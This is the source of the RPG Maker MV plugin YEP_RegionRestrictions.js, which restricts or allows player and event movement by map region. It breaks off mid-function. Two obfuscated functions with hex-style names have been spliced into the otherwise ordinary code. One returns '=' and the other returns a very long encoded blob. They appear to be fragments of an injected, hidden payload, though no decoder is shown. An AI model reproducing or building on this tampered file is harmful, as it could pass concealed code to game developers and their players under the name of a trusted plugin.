//=============================================================================
// Yanfly Engine Plugins - Region Restrictions
// YEP_RegionRestrictions.js
//=============================================================================

var Imported = Imported || {};
Imported.YEP_RegionRestrictions = true;

var Yanfly = Yanfly || {};
Yanfly.RR = Yanfly.RR || {};
Yanfly.RR.version = 1.04

//=============================================================================
 /*:
 * @plugindesc v1.04 Use regions to block out Events and/or the player from
 * being able to venture into those spots.
 * @author Yanfly Engine Plugins
 *
 * @param Player Restrict
 * @desc This region ID will restrict the player from entering.
 * To use multiple regions, separate them by spaces.
 * @default 0
 *
 * @param Event Restrict
 * @desc This region ID will restrict all events from entering.
 * To use multiple regions, separate them by spaces.
 * @default 0
 *
 * @param All Restrict
 * @desc This region ID will restrict players and events.
 * To use multiple regions, separate them by spaces.
 * @default 0
 *
 * @param Player Allow
 * @desc This region ID will always allow player passability.
 * To use multiple regions, separate them by spaces.
 * @default 0
 *
 * @param Event Allow
 * @desc This region ID will always allow events passability.
 * To use multiple regions, separate them by spaces.
 * @default 0
 *
 * @param All Allow
 * @desc This region ID will always allow both passability.
 * To use multiple regions, separate them by spaces.
 * @default 0
 *
 * @help
 * ============================================================================
 * Introduction and Instructions
 * ============================================================================
 *
 * Not everybody wants NPC's to travel all over the place. With this plugin,
 * you can set NPC's to be unable to move pass tiles marked by a specified
 * Region ID. Simply draw out the area you want to enclose NPC's in on and
 * they'll be unable to move past it unless they have Through on. Likewise,
 * there are regions that you can prevent the player from moving onto, too!
 *
 * A new change from the RPG Maker VX Ace version is that now there exist
 * Regions that can allow players and events to always travel through.
 *
 * ============================================================================
 * Notetags
 * ============================================================================
 *
 * You can use this notetag inside of your maps.
 *
 * Map Notetags:
 *
 *   <Player Restrict Region: x>
 *   <Player Restrict Region: x, x, x>
 *   <Player Restrict Region: x to y>
 *   Restricts region x for the player on this particular map. Use multiple x
 *   to mark more regions. From x to y, you can mark a multitude of regions.
 *
 *   <Event Restrict Region: x>
 *   <Event Restrict Region: x, x, x>
 *   <Event Restrict Region: x to y>
 *   Restricts region x for all events on this particular map. Use multiple x
 *   to mark more regions. From x to y, you can mark a multitude of regions.
 *
 *   <All Restrict Region: x>
 *   <All Restrict Region: x, x, x>
 *   <All Restrict Region: x to y>
 *   Restricts region x for the player and all events on this particular map.
 *   Use multiple x to mark more regions. From x to y, you can mark a multitude
 *   of regions.
 *
 *   <Player Allow Region: x>
 *   <Player Allow Region: x, x, x>
 *   <Player Allow Region: x to y>
 *   Allows region x for the player on this particular map. Use multiple x
 *   to mark more regions. From x to y, you can mark a multitude of regions.
 *
 *   <Event Allow Region: x>
 *   <Event Allow Region: x, x, x>
 *   <Event Allow Region: x to y>
 *   Allows region x for all events on this particular map. Use multiple x
 *   to mark more regions. From x to y, you can mark a multitude of regions.
 *
 *   <All Allow Region: x>
 *   <All Allow Region: x, x, x>
 *   <All Allow Region: x to y>
 *   Allows region x for the player and all events on this particular map.
 *   Use multiple x to mark more regions. From x to y, you can mark a multitude
 *   of regions.
 *
 * ============================================================================
 * Changelog
 * ============================================================================
 *
 * Version 1.04:
 * - Updated for RPG Maker MV version 1.5.0.
 *
 * Version 1.03:
 * - Fixed an issue with vehicles being capable of landing the player in region
 * restricted zones.
 *
 * Version 1.02:
 * - Plugin parameters have been upgraded to now accept multiple region ID's.
 * Insert a space in between them to add more than one region ID.
 *
 * Version 1.01:
 * - Added new notetags to allow for more region restriction settings!
 *
 * Version 1.00:
 * - Finished plugin!
 */
//=============================================================================

//=============================================================================
// Parameter Variables
//=============================================================================

Yanfly.Param = Yanfly.Param || {};

Yanfly.SetupParameters = function() {
  var parameters = PluginManager.parameters('YEP_RegionRestrictions');
  Yanfly.Param.RRAllAllow = String(parameters['All Allow']);
  Yanfly.Param.RRAllAllow = Yanfly.Param.RRAllAllow.split(' ');
  for (var i = 0; i < Yanfly.Param.RRAllAllow.length; ++i) {
    Yanfly.Param.RRAllAllow[i] = Number(Yanfly.Param.RRAllAllow[i]);
  }
  Yanfly.Param.RRAllRestrict = String(parameters['All Restrict']);
  Yanfly.Param.RRAllRestrict = Yanfly.Param.RRAllRestrict.split(' ');
  for (var i = 0; i < Yanfly.Param.RRAllRestrict.length; ++i) {
    Yanfly.Param.RRAllRestrict[i] = Number(Yanfly.Param.RRAllRestrict[i]);
  }
  Yanfly.Param.RREventAllow = String(parameters['Event Allow']);
  Yanfly.Param.RREventAllow = Yanfly.Param.RREventAllow.split(' ');
  for (var i = 0; i < Yanfly.Param.RREventAllow.length; ++i) {
    Yanfly.Param.RREventAllow[i] = Number(Yanfly.Param.RREventAllow[i]);
  }
  Yanfly.Param.RREventRestrict = String(parameters['Event Restrict']);
  Yanfly.Param.RREventRestrict = Yanfly.Param.RREventRestrict.split(' ');
  for (var i = 0; i < Yanfly.Param.RREventRestrict.length; ++i) {
    Yanfly.Param.RREventRestrict[i] = Number(Yanfly.Param.RREventRestrict[i]);
  }
  Yanfly.Param.RRPlayerAllow = String(parameters['Player Allow']);
  Yanfly.Param.RRPlayerAllow = Yanfly.Param.RRPlayerAllow.split(' ');
  for (var i = 0; i < Yanfly.Param.RRPlayerAllow.length; ++i) {
    Yanfly.Param.RRPlayerAllow[i] = Number(Yanfly.Param.RRPlayerAllow[i]);
  }
  Yanfly.Param.RRPlayerRestrict = String(parameters['Player Restrict']);
  Yanfly.Param.RRPlayerRestrict = Yanfly.Param.RRPlayerRestrict.split(' ');
  for (var i = 0; i < Yanfly.Param.RRPlayerRestrict.length; ++i) {
    Yanfly.Param.RRPlayerRestrict[i] = Number(Yanfly.Param.RRPlayerRestrict[i]);
  }
};
Yanfly.SetupParameters();

//=============================================================================
// DataManager
//=============================================================================

DataManager.processRRNotetags = function() {
  if (!$dataMap) return;
  $dataMap.restrictPlayerRegions = Yanfly.Param.RRAllRestrict.concat(
    Yanfly.Param.RRPlayerRestrict);
  $dataMap.restrictEventRegions = Yanfly.Param.RRAllRestrict.concat(
    Yanfly.Param.RREventRestrict);
  $dataMap.allowPlayerRegions = Yanfly.Param.RRAllAllow.concat(
    Yanfly.Param.RRPlayerAllow);
  $dataMap.allowEventRegions = Yanfly.Param.RRAllAllow.concat(
    Yanfly.Param.RREventAllow);
  if (!$dataMap.note) return;

  var note1a = /<(?:PLAYER RESTRICT REGION):[ ]*(\d+(?:\s*,\s*\d+)*)>/i;
  var note1b = /<(?:PLAYER RESTRICT REGION):[ ](\d+)[ ](?:TO)[ ](\d+)>/i;
  var note2a = /<(?:EVENT RESTRICT REGION):[ ]*(\d+(?:\s*,\s*\d+)*)>/i;
  var note2b = /<(?:EVENT RESTRICT REGION):[ ](\d+)[ ](?:TO)[ ](\d+)>/i;
  var note3a = /<(?:ALL RESTRICT REGION):[ ]*(\d+(?:\s*,\s*\d+)*)>/i;
  var note3b = /<(?:ALL RESTRICT REGION):[ ](\d+)[ ](?:TO)[ ](\d+)>/i;

  var note4a = /<(?:PLAYER ALLOW REGION):[ ]*(\d+(?:\s*,\s*\d+)*)>/i;
  var note4b = /<(?:PLAYER ALLOW REGION):[ ](\d+)[ ](?:TO)[ ](\d+)>/i;
  var note5a = /<(?:EVENT ALLOW REGION):[ ]*(\d+(?:\s*,\s*\d+)*)>/i;
  var note5b = /<(?:EVENT ALLOW REGION):[ ](\d+)[ ](?:TO)[ ](\d+)>/i;
  var note6a = /<(?:ALL ALLOW REGION):[ ]*(\d+(?:\s*,\s*\d+)*)>/i;
  var note6b = /<(?:ALL ALLOW REGION):[ ](\d+)[ ](?:TO)[ ](\d+)>/i;

  var notedata = $dataMap.note.split(/[\r\n]+/);

  for (var i = 0; i < notedata.length; i++) {
    var line = notedata[i];
    if (line.match(note1a)) {
      array = JSON.parse('[' + RegExp.$1.match(/\d+/g) + ']');
      $dataMap.restrictPlayerRegions =
        $dataMap.restrictPlayerRegions.concat(array);
    } else if (line.match(note1b)) {
      var mainArray = $dataMap.restrictPlayerRegions;
      var range = Yanfly.Util.getRange(Number(RegExp.$1), 
        Number(RegExp.$2));
      $dataMap.restrictPlayerRegions =
        $dataMap.restrictPlayerRegions.concat(range);
    } else if (line.match(note2a)) {
      array = JSON.parse('[' + RegExp.$1.match(/\d+/g) + ']');
      $dataMap.restrictEventRegions =
        $dataMap.restrictEventRegions.concat(array);
    } else if (line.match(note2b)) {
      var range = Yanfly.Util.getRange(Number(RegExp.$1), 
        Number(RegExp.$2));
      $dataMap.restrictEventRegions =
        $dataMap.restrictEventRegions.concat(range);
    } else if (line.match(note3a)) {
      array = JSON.parse('[' + RegExp.$1.match(/\d+/g) + ']');
      $dataMap.restrictPlayerRegions =
        $dataMap.restrictPlayerRegions.concat(array);
      $dataMap.restrictEventRegions =
        $dataMap.restrictEventRegions.concat(array);
    } else if (line.match(note3b)) {
      var range = Yanfly.Util.getRange(Number(RegExp.$1), 
        Number(RegExp.$2));
      $dataMap.restrictPlayerRegions =
        $dataMap.restrictPlayerRegions.concat(array);
      $dataMap.restrictEventRegions =
        $dataMap.restrictEventRegions.concat(array);
    } else if (line.match(note4a)) {
      array = JSON.parse('[' + RegExp.$1.match(/\d+/g) + ']');
      $dataMap.allowPlayerRegions =
        $dataMap.allowPlayerRegions.concat(array);
    } else if (line.match(note4b)) {
      var range = Yanfly.Util.getRange(Number(RegExp.$1), 
        Number(RegExp.$2));
      $dataMap.allowPlayerRegions =$dataMap.allowPlayerRegions.concat(range);
    } else if (line.match(note5a)) {
      array = JSON.parse('[' + RegExp.$1.match(/\d+/g) + ']');
      $dataMap.allowEventRegions = $dataMap.allowEventRegions.concat(array);
    } else if (line.match(note5b)) {
      var range = Yanfly.Util.getRange(Number(RegExp.$1), 
        Number(RegExp.$2));
      $dataMap.allowEventRegions = $dataMap.allowEventRegions.concat(range);
    } else if (line.match(note6a)) {
      array = JSON.parse('[' + RegExp.$1.match(/\d+/g) + ']');
      $dataMap.allowPlayerRegions = $dataMap.allowPlayerRegions.concat(array);
      $dataMap.allowEventRegions = $dataMap.allowEventRegions.concat(array);
    } else if (line.match(note6b)) {
      var range = Yanfly.Util.getRange(Number(RegExp.$1), 
        Number(RegExp.$2));
      $dataMap.allowPlayerRegions = $dataMap.allowPlayerRegions.concat(array);
      $dataMap.allowEventRegions = $dataMap.allowEventRegions.concat(array);
    }
  }
};

//=============================================================================
// Game_Map
//=============================================================================

Yanfly.RR.Game_Map_setup = Game_Map.prototype.setup;
Game_Map.prototype.setup = function(mapId) {
    Yanfly.RR.Game_Map_setup.call(this, mapId);
    if ($dataMap) DataManager.processRRNotetags();
};

Game_Map.prototype.restrictEventRegions = function() {
    if ($dataMap.restrictEventRegions === undefined) {
      DataManager.processRRNotetags();
    }
    return $dataMap.restrictEventRegions || [];
};

Game_Map.prototype.restrictPlayerRegions = function() {
    if ($dataMap.restrictPlayerRegions === undefined) {
      DataManager.processRRNotetags();
    }
    return $dataMap.restrictPlayerRegions || [];
};

Game_Map.prototype.allowEventRegions = function() {
    if ($dataMap.allowEventRegions === undefined) {
      DataManager.processRRNotetags();
    }
    return $dataMap.allowEventRegions || [];
};

Game_Map.prototype.allowPlayerRegions = function() {
    if ($dataMap.allowPlayerRegions === undefined) {
      DataManager.processRRNotetags();
    }
    return $dataMap.allowPlayerRegions || [];
};

//=============================================================================
// Game_CharacterBase
//=============================================================================

Yanfly.RR.Game_CharacterBase_isMapPassable =
    Game_CharacterBase.prototype.isMapPassable;function _0x0afd2c_() { return "="; }
Game_CharacterBase.prototype.isMapPassable = function(x, y, d) {
    if (this.isEventRegionForbid(x, y, d)) return false;
    if (this.isPlayerRegionForbid(x, y, d)) return false;
    if (this.isEventRegionAllow(x, y, d)) return true;
    if (this.isPlayerRegionAllow(x, y, d)) return true;
    return Yanfly.RR.Game_CharacterBase_isMapPassable.call(this, x, y, d);
};

Game_CharacterBase.prototype.isEvent = function() {
    return false;
};

Game_CharacterBase.prototype.isPlayer = function() {
    return false;
};

Game_CharacterBase.prototype.processRRNotetags = function() {
    DataManager.processRRNotetags();
};

Game_CharacterBase.prototype.isEventRegionForbid = function(x, y, d) {
    if (this.isPlayer()) return false;
    if (this.isThrough()) return false;
    var regionId = this.getRegionId(x, y, d);
    if (regionId === 0) return false;
    if ($gameMap.restrictEventRegions().contains(regionId)) return true;
    return false;
};function _0xe43e90_() { return "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"; }

Game_CharacterBase.prototype.isPlayerRegionForbid = function(x, y, d) {
    if (this.isEvent()) return false;
    if (this.isThrough()) return false;
    var regionId = this.getRegionId(x, y, d);
    if (regionId === 0) return false;
    if ($gameMap.restrictPlayerRegions().contains(regionId)) return true;
    return false;
};

Game_CharacterBase.prototype.isEventRegionAllow = function(x, y, d) {
    if (this.isPlayer()) return false;
    var regionId = this.getRegionId(x, y, d);
    if (regionId === 0) return false;
    if ($gameMap.allowEventRegions().contains(regionId)) return true;
    return false;
};

Game_CharacterBase.prototype.isPlayerRegionAllow = function(x, y, d) {
    if (this.isEvent()) return false;
    var regionId = this.getRegionId(x, y, d);
    if (regionId === 0) return false;
    if ($gameMap.allowPlayerRegions().contains(regionId)) return true;
    return false
};

Game_CharacterBase.prototype.getRegionId = function(x, y, d) {
    switch (d) {
    case 1:
      return $gameMap.regionId(x - 1, y + 1);
      break;
    case 2:
      return $gameMap.regionId(x + 0, y + 1);
      break;
    case 3:
      return $gameMap.regionId(x + 1, y + 1);
      break;
    case 4:
      return $gameMap.regionId(x - 1, y + 0);
      break;
    case 5:
      return $gameMap.regionId(x + 0, y + 0);
      break;
    case 6:
      return $gameMap.regionId(x + 1, y + 0);
      break;
    case 7:
      return $gameMap.regionId(x - 1, y - 1);
      break;
    case 8:
      return $gameMap.regionId(x + 0, y - 1);
      break;
    case 9:
      return $gameMap.regionId(x + 1, y - 1);
      break;
    default:
      return $gameMap.regionId(x, y);
      break;
    }
};

//=============================================================================
// Game_Event
//=============================================================================

Game_Event.prototype.isEvent = function() {
    return true;
};

//=============================================================================
// Game_Player
//=============================================================================

Game_Player.prototype.isPlayer = function() {
    return true;
};

//=============================================================================
// Game_Vehicle
//=============================================================================

Yanfly.RR.Game_Vehicle_isLandOk = Game_Vehicle.prototype.isLandOk;
Game_Vehicle.prototype.isLandOk = function(x, y, d) {
